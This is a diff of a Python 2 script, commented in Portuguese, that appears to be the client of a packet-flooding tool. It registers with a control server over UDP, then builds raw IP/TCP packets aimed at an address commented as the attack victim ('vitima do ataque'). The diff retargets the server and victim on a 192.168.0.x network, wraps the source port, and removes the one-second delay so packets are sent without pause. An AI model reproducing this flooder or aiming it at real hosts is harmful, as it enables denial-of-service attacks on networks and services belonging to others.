@@ -6,11 +6,16 @@ import sys
 import time
 from random import randint
 from struct import *
-serverName = '192.168.0.101'
+serverName = '192.168.0.102'
 serverPort = 12000
 clientSocket = socket(AF_INET, SOCK_DGRAM)
 
-clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
+try:
+    clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
+except error, e:
+    if e[0] == 101:
+        print 'Rede inacessivel'
+
 server = ('', 0)
 ATACANDO = False
 event = threading.Event()
@@ -39,8 +44,8 @@ def Ataque():
 
     packet = '';
      
-    source_ip = '10.0.02.15'
-    dest_ip = '192.168.0.1' #ou socket.gethostbyname('www.google.com')
+    source_ip = '192.168.0.119'
+    dest_ip = '192.168.0.102'  # vitima do ataque
      
     # cabecalhos fixos do ip
     ihl = 5
@@ -87,6 +92,8 @@ def Ataque():
 
 
         #cabecalho variavel do tcp
+        if source >= 65534:
+            source = 0
         source+=1
         seq+=1
         ack_seq=randint(0,4294967294)
@@ -114,7 +121,7 @@ def Ataque():
         print 'enviando pacote ' + str(id)
         #Envia o pacote
         s.sendto(packet, (dest_ip, 0))
-        time.sleep(1)
+        #time.sleep(1)
         
 
 def ThreadEnvio():
